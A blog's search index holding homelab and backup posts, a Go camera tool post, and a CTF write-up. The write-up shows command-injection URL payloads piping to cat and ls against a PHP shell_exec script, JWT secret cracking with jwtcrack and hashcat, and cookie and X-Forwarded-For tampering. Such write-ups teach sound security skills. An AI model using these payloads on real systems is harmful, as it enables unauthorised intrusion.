Pinute-specific files Proxmox Backup Server (/backupProxmox):\nStores incremental backups of VMs and LXC containers NAS:\nContains both the Proxmox backups (/backupProxmox) and the external hard drive\u0026rsquo;s backup (/backupExternal) Obs: In the future, a second external hard drive will be connected to Pinute. Once a month, Gbackup will create a tarball of the backupProxmox and backupExternal folders on the NAS. These compressed backups will be saved to the secondary hard drive as an additional layer of redundancy.\nDisaster Recovery If /mnt/external fails - info resides inside NAS \u0026amp; Second external hard drive\nBuy a new external HDD, plugg into Proxmox, rsync backup from NAS or Second external hard drive If NAS fails - VMs and LXC resides inside Second external hard drive\nReinstall Debian and PBS, setup PBS with same storage as before, import backup into that storage OR Reinstall Debian and PBS, setup PBS with the same storage as before and perform a VM/LXC backup If Proxmox fails - info resides inside NAS, /mnt/external \u0026amp; Second external hard drive\nReinstall Proxmox, import /mnt/external, add PBS, restore VM\u0026rsquo;s/LXC ", 
        "url": "http:\/\/localhost:1313\/posts\/2024-10-08-my-custom-nas\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-08-26-replace-proxmox-server\/": {
        "title": "Replace Proxmox Server",
        "tags": ["Homelab",],
        "content": "Introduction During college, I used ESXi to host some virtual machines (VMs). After graduating, I transitioned to Proxmox, using the same server—an old HP Z620.\nI was really pleased with that setup. It had everything I needed: VMs for my pentesting lab, LXC containers for personal projects, and a fully functional backup solution.\nThe problem However, the server started failing, and by that, I mean it would shut down for no apparent reason. I tried troubleshooting everything, but the server would only run for a day before shutting down again, until eventually, it wouldn\u0026rsquo;t boot at all.\nGiven this situation, I started scratching my head, trying to think of possible solutions. I concluded that the best approach would be to sell the hardware and buy a new server for my Proxmox setup.\nNote: It turned out that the problem was with the power supply. However, replacing the power supply would cost over 400 euros for a refurbished one, which isn\u0026rsquo;t worth it for a server that\u0026rsquo;s about 14 years old.\nNew server After searching for a few weeks, I found some interesting mini computers, like the ThinkCentre M90q Gen 4.\nI came across an online vendor offering a great deal, plus a 4-year warranty, which was even better.\nAfter purchasing the new server, I planned the additional hardware I would need to create a setup similar to or even better than the one I had with the HP Z620. I decided to buy 16 GB of RAM and a 1 TB NVMe SSD.\nWith these upgrades, the full server specifications are as follows:\nHardware Spec CPU 20 x 13th Gen Intel(R) Core(TM) i5-13500T RAM 2 x 16GB DDR5 5600MHz Fury Impact CL40 SO-DIMM STORAGE 1 TB 3D M.2 NVMe 2280 (3500/3000MB/s) + 250 GB M.2 NVMe GPU Onboard I planned to use the 1 TB NVMe SSD for my VMs, as they require the most storage (specifically, Windows Server and Windows Pro). The 250 GB drive is where Proxmox is installed.\nIn addition to this, I also have a 2 TB external hard drive connected via USB. This drive helps reduce the size of my LXC containers and VMs by storing their larger files. It also serves as a backup destination, so it needs to be accessible via LAN.\nProxmox configuration Previously, I had chosen the ZFS file system to work with Proxmox. However, this time I decided to use LVM (the default) to compare both setups, and so far, I am satisfied with using LVM.\nAfter installing the Proxmox OS on the 250 GB NVMe, I added the 1 TB NVMe as shown in the image below. Note that I configured it as an LVM Thin Pool to only occupy actual used space rather than the entire disk. This way, the storage size can grow over time as needed.\nThen, I added the 2 TB external hard drive by mounting it as an additional disk.\n$ mkdir /mnt/pve/external # Create a folder to mount the external hard drive $ ls -l /dev/disk/by-uuid/* # Find disk (external hard drive) by uuid $ echo \u0026#34;/dev/disk/by-uuid/\u0026lt;uuid\u0026gt; /mnt/pve/external ext4 defaults 0\u0026#34; \u0026gt;\u0026gt; /etc/fstab # Write the external hard drive uuid to fstab $ mount -a # Update fstab $ systemctl daemon-reload # Reload systemctl daemon $ lsblk # Verify the mapping After completing all the configurations, I added the external hard drive as storage in Proxmox, as shown below.\nThe current storage configuration is as follows:\ncrucal (pve) Storage for VMs external (pve) Storage for backups + misc stuff + ISOs local (pve) Proxmox OS local-lvm (pve) Storage for LXC Troubleshooting When creating LXC containers, I like to set everything up so I don\u0026rsquo;t need to rely on the Proxmox GUI, which is why I always set up SSH keys.\nHowever, LXCs can be tricky because if you create an unprivileged container, some utilities don’t work well. Additionally, using SSH in an LXC that doesn\u0026rsquo;t have nesting enabled can be very slow. I\u0026rsquo;ve found on some forums that this issue is related to DNS problems.\nTo fix this, I create a privileged LXC without nesting and then go to Proxmox and run the command pct set \u0026lt;container id\u0026gt; -features nesting=1. This completely resolves the SSH behavior issues.\nRestoring The restore process for the LXC went smoothly. I created a new LXC container and used rsync to transfer the backup configuration files, which worked perfectly.\nThe situation with the VMs were different, as I hadn\u0026rsquo;t been backing them up due to limited space in my previous setup.\nThis experience made me realize that I need to revise my approach with the new setup to better prepare for scenarios similar to those I encountered with the old server.\nFuture With these considerations in mind, I started developing a new backup plan—one that is more robust yet cost-effective.\nIn the next blog post, I\u0026rsquo;ll explain my thought process and outline my new approach for a refined backup mechanism. This new system will back up everything and ensure easy restoration, all while maintaining a reasonable amount of space on a new machine (spoiler alert:)).\nYes, I plan to use a pre-built NAS with affordable, compact components to back up everything I consider important. This will include a new version of the gbackup utility and a new, efficient computer that will serve as the NAS.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-08-26-replace-proxmox-server\/"
    },
    
    "http:\/\/localhost:1313\/tags\/golang\/": {
        "title": "Golang",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/golang\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-06-30-spying-on-my-dog-without-sd-card\/": {
        "title": "Spying on my dog without a SD Card",
        "tags": ["Golang",],
        "content": "Introduction Recently, I bought a camera to record Alex (my dog) when he is alone at home. However, after some initial research, I found that this camera only allows recording with an SD card. Additionally, when the SD card is being used for recording, I can\u0026rsquo;t use the RTSP (Real-Time Streaming Protocol).\nSince I don\u0026rsquo;t want to buy multiple SD cards for the several cameras I plan to have in the future, the best solution would be to have a program that records and saves the footage to a specific location, such as an HDD, without needing an SD card.\nHow With this in mind I built a small architecture first so It would be easier using Go.\nI decided to use the following:\nProgramming language (Go) RTSP reader (FFMPEG) Hosting server (Basic linux server) After enumerating all parts I built the following architecture:\nThe main goal of this project was:\nTo be able to record multiple cameras simultaneously To be able to stop the recording at any given time without losing the already recorded data To use a simple config file for the setup To have a simple web UI showing recordings that are currently running To have a JSON file containing all recordings marked as finished and canceled To use cURL to receive and send information, allowing integration with third-party apps The Tool After implementing all the features needed to record my little buddy, gocam was born.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-06-30-spying-on-my-dog-without-sd-card\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-04-12-how-i-perform-backups\/": {
        "title": "How I Perform Backups",
        "tags": ["Homelab",],
        "content": "Introduction Backups are like insurance policies for your digital life. They\u0026rsquo;re copies of your important files, stored in a safe place separate from your original data. Just as you wouldn\u0026rsquo;t want to risk losing everything in a fire without insurance, you don\u0026rsquo;t want to risk losing your precious photos, documents, or other files without backups.\nIn this blog post, I\u0026rsquo;ll share my personal insights and strategies for maintaining comprehensive backups, ensuring that no vital information slips through the cracks while also staying organized amidst the constant flux of data changes.\nTargets \u0026amp; Destinations Before diving into the backup process, it\u0026rsquo;s essential to define two key elements: the targets (backup sources) and the backup destinations.\nTargets encompass the data we deem critical for backup. This could include documents, photos, videos, and any other files essential to our digital lives. By identifying these targets, we ensure that no vital information is overlooked during the backup process.\nNext, we determine where we want to store these backups, our backup destinations. This could involve a combination of options such as cloud storage services like Google Drive or Dropbox, external hard drives, network-attached storage (NAS) devices, or even dedicated backup servers. Each option offers its advantages in terms of accessibility, redundancy, and security.\nIn my use case I backup all files from my work laptop, gokrazy databases and important data within LXC containers on Proxmox. This way, if there\u0026rsquo;s a system failure, I can rebuild everything and upload the files for a quick recovery.\nRsync With targets and destinations set, it\u0026rsquo;s time to select the backup method. Rsync emerges as a formidable choice, boasting efficient file synchronization capabilities. Its ability to perform incremental backups minimizes data transfer, making it ideal for handling large files and slow network connections.\nPrometheus \u0026amp; Grafana Ensuring the integrity of our backup process requires meticulous inspection of file changes within specific date ranges, alongside gathering insightful metrics. To accomplish this, I\u0026rsquo;ve opted for Prometheus and Grafana, renowned for their robust monitoring and visualization capabilities.\nGolang Golang\u0026rsquo;s asynchronous processing capabilities make it the perfect companion for integrating data with Prometheus, ensuring seamless operation and performance optimization.\nThe Finale Enter gbackup, the culmination of these efforts. This tool orchestrates the backup plan, covering essential partitions, databases, and files across various locations, ensuring data resilience.\nThe current backup plan is the following:\ngokrazy perm partion (resides in gokrazy) gokrazy data folder (resides in a LXC in proxmox) postgresql databases (resides in a LXC in proxmox) currently I am only doing the backup for the waiw and leak databases syncthing folder (resides in a LXC in proxmox) monitoring files (resides in a LXC in proxmox this is files from alertmanager, prometheus, grafana and pushgateway work laptop For the backup locations, I utilize two distinct setups. Firstly, an external hard drive directly connected to Proxmox serves as one backup destination. Secondly, I employ an internal hard drive within the Proxmox environment as a secondary backup location. This dual setup ensures redundancy and reliability in safeguarding critical data.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-04-12-how-i-perform-backups\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-11-06-redteaming-ep1\/": {
        "title": "Red Teaming EP1: C2 and Phishing Simulation",
        "tags": ["Red Teaming",],
        "content": "This is the first of three articles that will be published concerning social engineering campaigns during red teaming exercises (while I was working at ArtResilia). Follow this link for the original blog post.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-11-06-redteaming-ep1\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-08-21-0xoposec\/": {
        "title": "0xOPOSEC Summer Challenge 2023",
        "tags": ["CTF",],
        "content": "\u0026ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.\u0026rdquo;\nWeb The Flag Dispenser \u0026ldquo;Your first step is to fool our Flag Dispenser into thinking you\u0026rsquo;re an admin. http://flagdispenser.0d.al/ Good luck!\u0026rdquo;\nBy navigating to the provided URL we can see that a cookie is present with the value of plebeian.\nAfter changing that value to admin I got the flag.\nflag{welcome_admin_pls_take_flag_uwu} Recon All The Things \u0026ldquo;The purpose of recon is to gather insights that can be used to identify weaknesses and better understand the target environment for potential attack surfaces.\u0026rdquo; \u0026ldquo;Gather your tools and search for some hidden gems. http://20.185.41.52/\u0026rdquo;\nAfter reading the challenge description I immediately decided to use nuclei.\n$ ./nuclei -u http://20.185.41.52/ __ _ ____ __ _______/ /__ (_) / __ \\/ / / / ___/ / _ \\/ / / / / / /_/ / /__/ / __/ / /_/ /_/\\__,_/\\___/_/\\___/_/ v2.9.10 projectdiscovery.io [INF] nuclei-templates are not installed, installing... [INF] Successfully installed nuclei-templates at /home/brun0/nuclei-templates [INF] Current nuclei version: v2.9.10 (latest) [INF] Current nuclei-templates version: v9.6.0 (latest) [INF] New templates added in latest release: 33 [INF] Templates loaded for current scan: 6461 [INF] Targets loaded for current scan: 1 [INF] Templates clustered: 1178 (Reduced 1119 Requests) [php-detect] [http] [info] http://20.185.41.52/ [5.6.40] [openssl-detect] [http] [info] http://20.185.41.52/ [OpenSSL/1.0.2q] [apache-detect] [http] [info] http://20.185.41.52/ [Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40] [tech-detect:php] [http] [info] http://20.185.41.52/ [http-trace:trace-request] [http] [info] http://20.185.41.52/ [http-missing-security-headers:permissions-policy] [http] [info] http://20.185.41.52/ [http-missing-security-headers:x-frame-options] [http] [info] http://20.185.41.52/ [http-missing-security-headers:x-content-type-options] [http] [info] http://20.185.41.52/ [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://20.185.41.52/ [http-missing-security-headers:referrer-policy] [http] [info] http://20.185.41.52/ [http-missing-security-headers:clear-site-data] [http] [info] http://20.185.41.52/ [http-missing-security-headers:strict-transport-security] [http] [info] http://20.185.41.52/ [http-missing-security-headers:content-security-policy] [http] [info] http://20.185.41.52/ [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://20.185.41.52/ [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://20.185.41.52/ [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://20.185.41.52/ [waf-detect:apachegeneric] [http] [info] http://20.185.41.52/ [docker-compose-config] [http] [medium] http://20.185.41.52/docker-compose.yml [rdp-detect:win2016] [tcp] [info] 20.185.41.52:3389 Nuclei detected a yml file in http://20.185.41.52/docker-compose.yml.\nThe presented yml file contained a \u0026ldquo;private repo\u0026rdquo;.\nversion: \u0026#39;3.6\u0026#39; services: webapp: build: context: ./.client dockerfile: Dockerfile entrypoint: env_file: - ./.private_file_do_not_change volumes: - \u0026#34;./.client:/app\u0026#34; - \u0026#34;nodedata:/app/node_modules\u0026#34; ports: - \u0026#34;3000:3000\u0026#34; uid-sku-api: build: context: ./ dockerfile: Dockerfile entrypoint: - npx - babel-node - --presets - \u0026#34;@babel/preset-env\u0026#34; - server volumes: - \u0026#34;./:/app\u0026#34; ports: - \u0026#34;3001:3001\u0026#34; volumes: nodedata: By navigating to http://20.185.41.52/.private_file_do_not_change I got the flag.\nflag{pr1v4t3_d0cker_f1l3} The Poor Man Proxy \u0026ldquo;A proxy is an intermediary server that acts as a bridge between a client and a destination server. When a client sends a request to access a resource on the internet, it first goes through the proxy server, which then forwards the request to the destination server on behalf of the client. The response from the destination server is then relayed back to the client through the proxy. URL: http://notes.0d.al/\"\nLooking at the website we got what its seems like a static page with a TODO list.\nAfter enumerating for a while, I couldn\u0026rsquo;t find anything useful with gobuster and nuclei so I checked the challenge description again and I immediately though about X-Forwarded-For. When a client connects directly to a server, the client\u0026rsquo;s IP address is sent to the server. But if a client connection passes through any forward or reverse proxies, the server only sees the final proxy\u0026rsquo;s IP address. So X-Forwarded-For is a common method for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.\nKnowing this I first verified the length in bytes of the response when doing a normal request.\nThen when adding the X-Forwarded-For header with the value 127.0.0.1 the response length increased and then I got the flag.\nflag{HTTP_XFF_FOR_THE_WIN!} Whois? \u0026ldquo;The \u0026ldquo;whois\u0026rdquo; is used to query the WHOIS database to retrieve information about domain names, IP addresses, and other network resources. http://whois.0d.al:1341/\"\nI am not going to lie, I\u0026rsquo;ve spent some time in this challenge since I had no clue what to do here. After attempting some basic injections (SSTI,SQLi,\u0026hellip;) I got nothing.\nThen I tried looking at the request in Burp and it looked like a custom shell command.\nRunning a random whois with the following URL http://whois.0d.al:1341/?host=whois.ripe.net\u0026query=something got something like the image below.\nAfter a couple of minutes I started to realize that this could be command injection, however there must be two args. With that I assumed the following:\nhost= probably the whois command with the given API query= probably the second arg , appended to the first arg With this in mind I tried to inject a command in the first argument and see the output (http://whois.0d.al:1341/?host=whois.ripe.net|id\u0026amp;query=something whois|id something)\nThis did not worked like I was expecting and after a couple of tries I started to think that the flag is probably inside a file so maybe I needed to first enumerate that file and then cat the content.\nI injected a ls in the first arg and a dot in the second one (http://whois.0d.al:1341/?host=whois.ripe.net|ls\u0026amp;query=. whois|ls .) and got the following output.\nNice! Now that I now what is the file name containing the flag, I can just cat and finish the challenge (http://whois.0d.al:1341/?host=whois.ripe.net|cat\u0026amp;query=59bcc3ad6775562f845953cf01624225 whois|cat 59bcc3ad6775562f845953cf01624225).\nflag{CMD_INJ_NINJA!} Now that the challenge was finished, I wanted to deep dive into the .php file present.\n\u0026lt;?php error_reporting(0); $output = null; $host_regex = \u0026#34;/^[0-9a-zA-Z][0-9a-zA-Z\\.-\\|]+$/\u0026#34;; $query_regex = \u0026#34;/^[0-9a-zA-Z\\. ]+$/\u0026#34;; if (isset($_GET[\u0026#34;query\u0026#34;]) \u0026amp;\u0026amp; isset($_GET[\u0026#34;host\u0026#34;]) \u0026amp;\u0026amp; is_string($_GET[\u0026#34;query\u0026#34;]) \u0026amp;\u0026amp; is_string($_GET[\u0026#34;host\u0026#34;])) { $query = $_GET[\u0026#34;query\u0026#34;]; $host = $_GET[\u0026#34;host\u0026#34;]; if (!preg_match($host_regex, $host) || !preg_match($query_regex, $query)) { $output = \u0026#34;Invalid query or whois host.\u0026#34;; } else { $output = shell_exec(\u0026#34;/usr/bin/whois -h ${host} ${query}\u0026#34;); } } else { $output = \u0026#34;host and query are required.\u0026#34;; } ?\u0026gt; As shown above , the function shell_exec is executing the whois command and looks like the only user validation they are doing is with a regex that can easily be bypassed The host regex matches a single character in the range between . (index 46) and | (index 124) (case sensitive) when using \\.-\\|. This way its possible to use , | to inject a command.\nThis Looks Familiar \u0026ldquo;The security team noticed a few security problems with the Flag Dispenser and made it much more secure! http://protectedflagdispenser.0d.al/\"\nThis was a similar to The Flag Dispenser, however now a JWT is being used.\nI then tried tampering the jwt:\nchange the alg to none change the role to admin change the alg type to another one But none of this worked and since this was a simple jwt that didn\u0026rsquo;t contained more details I started googling ways of breaking this.\nThen I came across a realy cool post that defines various ways of attacking a JWT.\nLooking at the section of JWT Secret Brute Forcing I saw an important note: A key of the same size as the hash output (for instance, 256 bits for \u0026quot;HS256\u0026quot;) or larger MUST be used with this algorithm. Shorter keys can be brute forced..\nSo I started this approach by using jwt cracker to try to crack the jwt key. This tool worked like a charm and I got the secret(1337).\n$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoicGxlYmVpYW4ifQ.Ab5jOyoJQOrpl96XvMwqmqKJrDGIryCbzqt7483yow4 Secret is \u0026#34;1337\u0026#34; Note that this could also be done using hashcat\n$ hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoicGxlYmVpYW4ifQ.Ab5jOyoJQOrpl96XvMwqmqKJrDGIryCbzqt7483yow4 /usr/share/wordlists/rockyou.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoicGxlYmVpYW4ifQ.Ab5jOyoJQOrpl96XvMwqmqKJrDGIryCbzqt7483yow4:1337 After finding out the secret, I added the role admin by signing the JWT.\nflag{wym_a_4_digit_secret_is_not_enough?} Crypto Healthy \u0026ldquo;I\u0026rsquo;ve been on a journey to improve body and mind. I do exercise, I eat salads, and yet I have not been able to lose any weight! I found a website claiming that Caesar, the Roman Emperor, had a special secret to make any diet work. I thought I had found the solution to my weight problem, but Caesar\u0026rsquo;s diet trick is encoded: qbabgrngqbahgf. Can you help me?\u0026rdquo;\nThis was clearly an easy challenge for the Caesar\u0026rsquo;s cipher with a twist.\nWe didn\u0026rsquo;t knew what was the shift number to decode the respective message. Don\u0026rsquo;t get me wrong, this is not a problem as we could just brute-force the 26 possible shifts and gather the flag.\ndonoteatdonuts Kadabra used Substitute! \u0026ldquo;Ctsy sy i ylpycsclcsdo asktmf. Tmfm, miat zmccmf dn ctm izktipmc sy fmkziamj ph iodctmf. Ifm hdl fmijh ndf ctm nziq? Zmc\u0026rsquo;y qd: nziq{s_tdkm_hdl_ycszz_tibm_i_nmx_gsolcmy_zmnc}\u0026rdquo;\nThe challenge name already provide a little bit of info that this must be a substitute cipher. Adding to this we know that the format of the flag is flag{} meaning that nziq = flag.\nUsing an alphabet mapping website I got the following output.\nthis is a substitution cipher. here, each letter of the alphabet is replaced by another. are you ready for the flag? let's go: flag{i_hope_you_still_have_a_few_minutes_left}\nflag{i_hope_you_still_have_a_few_minutes_left} It Is All About Magic \u0026ldquo;Can you guess the secret for this encrypted file xor not?\u0026rdquo;\nWe got what it looks like an encripted jpg file. Reading the challenge description I can assume it was encripted using XOR.\nTo reverse a XOR cipher, I would need to perform the XOR operation again with the same key that was used to encrypt the original file. This happens because the XOR operation is a bitwise operation that takes two inputs and outputs a new value that is the result of applying the operation to each bit in the inputs.\nSo I need to:\nobtain the key that was used to encrypt the file apply the xor operation to the encrypted file using the same key To obtain the key I used a script that takes an input file and tries to find the key.\n$ python3 xor-decrypt/xor-decrypt.py -i \u0026#34;magic_image.jpg.enc\u0026#34; -m 32 -f 32 Probable key lengths: 5 - 4.9% Found a key: M4GIC The key made sense since the name of the challenge has the \u0026ldquo;magic\u0026rdquo; word in it, so the next thing to do would be to use the known key and XOR the input file again to get the decrypted file.\n$ python3 xor-decrypt/xor-decrypt.py -i \u0026#34;magic_image.jpg.enc\u0026#34; -o \u0026#34;output.jpg\u0026#34; -k M4GIC -d flag{Y0u-kN0w-S0m3-Tr1Cks} I Forgot My Phone Number \u0026ldquo;Please, help me. I forgot my phone number. Thankfully, I found a hash of it (sha256) in some application logs. dd007cb8341261d248a87c58d7013b0f7bbe8e0b4172d34d561e0f5b0c84634d Can you help me recover my phone number? Note: Don\u0026rsquo;t forget the country prefix! It\u0026rsquo;s a portuguese number. The whole number should look like:+351XXXXXXXXX\u0026rdquo;\nThis was the perfect challenge to show hashcat power while using masks. They gave us the hash and we know that the format is a sha256 and we also know that the pattern has to contain +351 and numbers. With this information, the scope starts to decrease making it possible to brute-force the hash.\n$ echo \u0026#34;dd007cb8341261d248a87c58d7013b0f7bbe8e0b4172d34d561e0f5b0c84634d\u0026#34; \u0026gt; hash $ echo \u0026#34;+351?d?d?d?d?d?d?d?d?d\u0026#34; \u0026gt; mask $ hashcat -m 1400 -a 3 hash mask dd007cb8341261d248a87c58d7013b0f7bbe8e0b4172d34d561e0f5b0c84634d:+351968210943 +351968210943 Misc A Different Kind of Flag Searching for AACS hex in Google i\u0026rsquo;ve found that this is AACS encryption key controversy.\nAccording to wikipedia:\nA controversy surrounding the AACS cryptographic key arose in April 2007 when the Motion Picture Association of America and the Advanced Access Content System Licensing Administrator, LLC (AACS LA) began issuing cease and desist letters[7] to websites publishing a 128-bit (16-byte) number, represented in hexadecimal as 09 F9 11 02 9D 74 E3 5B D8 41 56 C5 63 56 88 C0[8][9] (commonly referred to as 09 F9), a cryptographic key for HD DVDs and Blu-ray Discs. The letters demanded the immediate removal of the key and any links to it, citing the anti-circumvention provisions of the United States Digital Millennium Copyright Act (DMCA).\nIn order to complete this challenge I used a color picker extractor tool to gather the hex values of the image. That gave me the following output:\n666c61677b5f4f685f4e316e455f6546665f4e694e655f7d After converting from hex to ascii I got the flag.\nflag{_Oh_N1nE_eFf_NiNe_} No One Can Read This! \u0026ldquo;Obfuscation can provide some level of protection against reverse-engineering and unauthorized access to sensitive code or algorithms. It makes it harder for attackers to understand the inner workings of the code and extract valuable information. Are you up for the challenge of breaking this highly secure code? https://pastebin.com/XLQJGZd8\"\nOpening the pastebin link we got javascript code obfuscated.\nfunction _0x18d3(){var n=[\u0026#34;986812zTyGkV\u0026#34;,\u0026#34;7564912lJTdqw\u0026#34;,\u0026#34;ZmxhZ3tUaGlzSXN\u0026#34;,\u0026#34;1218535gGCsbz\u0026#34;,\u0026#34;58236qqPWAI\u0026#34;,\u0026#34;3190257ERjObe\u0026#34;,\u0026#34;19843bqzMoy\u0026#34;,\u0026#34;26gIYNza\u0026#34;,\u0026#34;1330485xEwykw\u0026#34;];return(_0x18d3=function(){return n})()}function _0x58e0(n,r){var t=_0x18d3();return(_0x58e0=function(n,r){return t[n-=358]})(n,r)}function _0x414243(){var n=_0x58e0;console.log(n(366)+\u0026#34;KU09iZnVzY2F0aW9uIX0\u0026#34;)}!function(n,r){for(var t=_0x58e0,e=_0x18d3();;)try{if(668689===parseInt(t(361))/1*(-parseInt(t(362))/2)+parseInt(t(363))/3+parseInt(t(364))/4+-parseInt(t(358))/5+-parseInt(t(359))/6+-parseInt(t(360))/7+parseInt(t(365))/8)break;e.push(e.shift())}catch(n){e.push(e.shift())}}(); After some minutes manualy deobfuscating the given code I came to the following better looking code.\nfunction _0x18d3() { var n = [\u0026#34;986812zTyGkV\u0026#34;, \u0026#34;7564912lJTdqw\u0026#34;, \u0026#34;ZmxhZ3tUaGlzSXN\u0026#34;, \u0026#34;1218535gGCsbz\u0026#34;, \u0026#34;58236qqPWAI\u0026#34;, \u0026#34;3190257ERjObe\u0026#34;, \u0026#34;19843bqzMoy\u0026#34;, \u0026#34;26gIYNza\u0026#34;, \u0026#34;1330485xEwykw\u0026#34;]; return (_0x18d3 = function () { return n; })(); } function _0x58e0(n, r) { var t = _0x18d3(); return (_0x58e0 = function (n, r) { return t[n -= 358]; })(n, r); } function _0x414243() { var n = _0x58e0; console.log(_0x58e0(366) + \u0026#34;KU09iZnVzY2F0aW9uIX0\u0026#34;); } !function (n, r) { var t = _0x58e0; for (var e = _0x18d3();;) { try { if (668689 === parseInt(_0x58e0(361)) / 1 * (-parseInt(_0x58e0(362)) / 2) + parseInt(_0x58e0(363)) / 3 + parseInt(_0x58e0(364)) / 4 + -parseInt(_0x58e0(358)) / 5 + -parseInt(_0x58e0(359)) / 6 + -parseInt(_0x58e0(360)) / 7 + parseInt(_0x58e0(365)) / 8) { break; } e.push(e.shift()); } catch (n) { e.push(e.shift()); } } }(); Looking at the code, I can see that the function _0x414243() is acting like the main function. After running that I got what it looked like a base64 string.\n$ node a.js ZmxhZ3tUaGlzSXNKU09iZnVzY2F0aW9uIX0 Decoded the string and got the flag.\n$ echo \u0026#34;ZmxhZ3tUaGlzSXNKU09iZnVzY2F0aW9uIX0\u0026#34; | base64 -d flag{ThisIsJSObfuscation!} Note that there is a cool website that helps deobfuscating.\nAre You a Good Scientist? \u0026ldquo;Scientists have discovered an unknown DNA sequence that may belong to a new species, but they are stuck. Can you help them to proceed with the investigation?\u0026rdquo; \u0026ldquo;CGCGCGTACGACCGCTCTGTCATCATCACACGATCACACTATCACACGATAACTTC\u0026rdquo;\nThis challenge took me a while to solve since I was looking at genetic stuff. However this was easy because DNA sequence can be represented in binary data:\nA = 00 C = 01 G = 10 T = 11 Using this information I represented the given DNA sequence in binary.\n0110011001101100011000010110011101111011010011010011010001000110001101000100011100110100010001100011000001111101\nThen I transformed the binary data to text and got the flag.\nflag{M4F4G4F0} Trivia Thirty-Two \u0026ldquo;I was born way before NTFS. What is my maximum file size (in bytes)?\u0026rdquo;\nSince they are saying that they were born way before NFTS and the challenge name is thirty two I assumed that they were refering to FAT32.\nI know for a fact that FAT32 maximum file size is 4,294,967,295 bytes being that the flag.\n4294967295 No Google \u0026ldquo;I hold the power to shape what search engines see, Controlling the content that\u0026rsquo;s indexed, that\u0026rsquo;s me. With authority over visibility, I dictate the view, Influencing which parts of the website come through. What am I?\u0026rdquo;\nHmmm if you are not google you must be robots.txt.\nrobots.txt The Most Beautiful Woman in Film \u0026ldquo;In films I mesmerized with my grace and my charm, But behind the scenes, my intellect caused alarm. So tell me, who am I, this star with brains and flair? A beauty and an inventor, a name quite rare.\u0026rdquo;\nThis was an easy one since Google was my friend. I only copied the part \u0026ldquo;A beauty and an inventor, a name quite rare\u0026rdquo; and that led me to an article.\nReading the article I could find that \u0026ldquo;Hollywood actress Hedy Lamarr, \u0026rsquo;the Angelina Jolie of her day,\u0026rsquo; was also an avid inventor and the person behind advances in communication technology in the 1940s that led to today’s Wi-Fi, GPS, and Bluetooth\u0026rdquo; and TIL.\nHedy Lamarr Java Nightmare! \u0026ldquo;In the realm of Java\u0026rsquo;s coding sphere, A silent menace, a danger unclear. A library\u0026rsquo;s flaw, a vulnerability deep, Unleashing havoc, causing systems to weep. With its loggers and appenders, it sneaks through, Exploited by those with malicious view. What am I, this weak link in the chain?\u0026rdquo;\nAnother easy challenge refering to log4j. However the flag was not that but log4shell\nLog4Shell refers to a critical vulnerability discovered in the Apache Log4j library. Attackers exploited the vulnerability by injecting malicious code into log messages or by exploiting the library\u0026rsquo;s JNDI (Java Naming and Directory Interface) lookup feature.\nlog4shell Conclusion This year I was not able to finish all challenges as I was busy during summer. However I placed 10th which is not bad at all since I had only 2 or 3 days to explore the challenges. Excited to the Christmas challenge 2023!\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-08-21-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-05-26-tinygo-in-microcontrollers\/": {
        "title": "TinyGo in Microcontrollers",
        "tags": ["Golang",],
        "content": "Introduction Recently (at work) I had to flash a microcontroller to simulate a keyboard. The problem was that I didn\u0026rsquo;t knew anything about microcontrollers (still don\u0026rsquo;t) or even how could I flash those.\nAt the time I was using the Digispark microcontroller since it was cheap and it was user friendly (with an external case, the device looks like a normal usb). Then a co-worker helped me on the flashing process and for that we used Arduino IDE.\nThis process was a bit overwhelm because I had to run multiple scripts in order to convert keyboard presses into arduino language (because I wanted to run Rubber Ducky scripts), however, the way this can be done is well documented on the internet.\nAfter this, I decided to take a look at other alternatives since Arduino IDE was sometimes buggy and not user friendly at all. And with that I\u0026rsquo;ve found TinyGo.\nTinyGo Looking at the TinyGo website: TinyGo brings the Go programming language to embedded systems and to the modern web by creating a new compiler based on LLVM. Basically, you can compile and run Go code inside microcontrollers by using Tinygo.\nAfter some hours of digging in the documentation I\u0026rsquo;ve found that they support the USB HID for some devices and in order to simulate keyboard presses I needed the USB HID.\nHowever, the device I had was a Digispark and according to one of the TinyGo maintainers, this device does not have USB hardware so it needs to be bit-banged.\nAfter this, I realised that I needed to choose another microcontroller (until they don\u0026rsquo;t support Digispark).\nLooking at the release notes for TinyGo I\u0026rsquo;ve found what devices they support for USB HID.\nsamd21 looked promising, so I went out and bought a Seeed XIAO samd21.\nXIAO XIAO SAMD21 is an ultra-small universal development board, supporting Arduino / Micropython / CircuitPython and much more.\nIt operates up until 48MHz and it has 32KB of SRAM and 256KB of onboard flash memory.\nIn terms of development interfaces:\n11x analog / 11x digital Pins 1x I2C interface 1x UART port 1 SPI port Flashing XIAO Looking at this issue we can see that TinyGo flash does not work on Seeed XIAO because as recently as Dec 2022, the Seeed Studio XIAO M0 dev boards shipped with a bootloader from Nov 2019: UF2 Bootloader v3.7.0-33-g90ff611-dirty SFHWRO.\nKnowing this, I had to find the new MSD (Mass Storage Device). For that, I plugged the device into my computer, opened the device in my file manager and checked the files present in it. After getting the new MSD name, I\u0026rsquo;ve created a new target (in 